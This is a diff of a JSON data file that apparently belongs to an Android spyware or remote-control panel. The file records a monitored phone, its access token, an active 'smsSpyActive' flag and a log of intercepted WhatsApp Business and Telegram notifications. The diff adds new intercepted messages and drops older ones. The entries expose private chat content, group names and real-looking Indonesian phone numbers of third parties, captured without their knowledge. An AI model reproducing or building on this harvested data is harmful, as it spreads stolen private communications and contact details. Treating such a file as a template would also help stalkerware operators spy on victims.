@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775641560245,
+    "lastSeen": 1775641573689,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎11 pesan dari 3 chat",
+        "time": "08/04 16:46",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775641574488
+      },
+      {
+        "appName": "WA Business",
+        "sender": "‎𝐍𝐀𝐗𝐑𝐀𝐓 𝐊𝐈𝐋𝐋 𝐘𝐎𝐔̫͍ (2 pesan): Membalas Anda",
+        "content": "~ KiebbDilzxx Unchek: Yes",
+        "time": "08/04 16:46",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775641574466
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎8 pesan dari 2 chat",
+        "time": "08/04 16:46",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775641574383
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-4046-8707",
+        "content": "🗿",
+        "time": "08/04 16:46",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775641574358
+      },
+      {
+        "appName": "WA Business",
+        "sender": "‎JB || KHAFA X NAZRIEL (7 pesan): ~ HAMSKY STORE REAL",
+        "content": "+62 877-9429-3798",
+        "time": "08/04 16:46",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775641574337
+      },
       {
         "appName": "Telegram",
         "sender": "STORE Reski",
@@ -4278,46 +4318,6 @@
         "time": "08/04 15:19",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775636376243
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 15:19",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636376217
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Alifzx rezz",
-        "content": "Apa",
-        "time": "08/04 15:19",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636376185
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "13 new messages from 12 chats",
-        "time": "08/04 15:19",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636376146
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 15:19",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636376058
-      },
-      {
-        "appName": "Telegram",
-        "sender": "TEAM ZANXRES: You",
-        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
-        "time": "08/04 15:19",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636376019
       }
     ],
     "galleryPhotos": [],
